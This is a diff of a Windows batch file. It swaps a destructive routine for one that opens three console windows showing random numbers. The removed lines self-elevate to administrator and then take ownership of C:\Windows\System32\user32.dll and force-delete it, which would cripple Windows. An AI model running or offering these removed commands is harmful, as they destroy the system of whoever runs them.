@@ -1,8 +1,10 @@
 @echo off
+setlocal enabledelayedexpansion
 
-if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin; exit /b)
+set /a num1=%random% %% 100
+set /a num2=%random% %% 100
+set /a num3=%random% %% 100
 
-
-takeown /f "C:\Windows\System32\user32.dll"
-icacls "C:\Windows\System32\user32.dll" /grant administrators:F /T
-del /f "C:\Windows\System32\user32.dll"
+start cmd /k echo Random Message Window 1: %num1%
+start cmd /k echo Random Message Window 2: %num2%
+start cmd /k echo Random Message Window 3: %num3%
